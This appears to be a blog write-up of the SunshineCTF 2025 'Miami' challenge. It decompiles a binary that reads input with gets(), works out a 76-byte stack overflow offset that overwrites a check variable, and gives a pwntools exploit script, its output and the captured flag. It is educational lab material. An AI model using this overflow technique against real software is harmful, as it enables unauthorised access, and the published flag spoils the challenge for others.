---
layout: post
title:  "Miami"
date:   2025-09-29 13:07:43 -0400
author: robo.uzi
tags: [ctf]
permalink: /sunshine-2025-miami/
---

**Title:** Miami

**Category:** I95

**Author:** Oreomeister

**Description:** Dexter is the prime suspect of being the Bay Harbor Butcher, we break into his login terminal and get the proof we need! `nc chal.sunshinectf.games 25601`

I get this binary:
```shell
file miami  
miami: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f942abae006e6117fd2d834c293b953beffbf2b4, for GNU/Linux 3.2.0, not stripped  

./miami  
Enter Dexter's password: password  
Invalid credentials!
```

I open it in ghidra. Here is the main function:
```d
void vuln(void)

{
  undefined8 local_58;
  undefined8 local_50;
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  undefined4 local_18;
  int local_c;
  
  local_c = -0x21524111;
  local_58 = 0;
  local_50 = 0;
  local_48 = 0;
  local_40 = 0;
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  local_18 = 0;
  printf("Enter Dexter\'s password: ");
  gets((char *)&local_58);
  if (local_c == 0x1337c0de) {
    puts("Access granted...");
    read_flag();
  }
  else {
    puts("Invalid credentials!");
  }
  return;
}
```

I manually test for a buffer overflow locally and find the offset at 76. That amount of characters fills the buffer up to the 4 bytes that correspond to `local_c`. When `local_c` is equal to `0x1337c0de` it prints `Access granted...` and calls `read_flag()`.

Run this script to get the flag:
```python
#!/usr/bin/env python3
from pwn import remote

HOST = "chal.sunshinectf.games"
PORT = 25601

offset = 76
magic = 0x1337c0de

payload = b"A" * offset + magic.to_bytes(4, "little")

r = remote(HOST, PORT)
try:
    r.recvuntil(b"Enter Dexter's password: ", timeout=2)
except Exception:
    pass

r.sendline(payload)
print(r.recvrepeat(timeout=1).decode(errors="replace"))
```

Output:
```shell
python3 solve3.py  
[+] Opening connection to chal.sunshinectf.games on port 25601: Done  
Access granted...  
sun{DeXtEr_was_!nnocent_Do4kEs_w4s_the_bAy_hRrb0ur_bu7cher_afterall!!}  

[*] Closed connection to chal.sunshinectf.games port 25601
```

`sun{DeXtEr_was_!nnocent_Do4kEs_w4s_the_bAy_hRrb0ur_bu7cher_afterall!!}`